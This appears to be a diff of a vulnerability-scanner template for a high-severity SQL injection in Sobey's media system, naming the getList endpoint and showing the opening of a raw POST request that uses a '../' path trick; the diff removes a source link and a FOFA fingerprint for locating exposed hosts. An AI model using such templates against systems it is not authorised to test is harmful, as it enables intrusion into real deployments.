@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体系统 getList 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ksygcg2cw6qi1bmn'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ksygcg2cw6qi1bmn
-    fofa: app="SOBEY-融媒体"
 http:
 - raw:
   - 'POST /sobey-mchEditor/mch/Articlelist/queryByCode/../getList HTTP/1.1
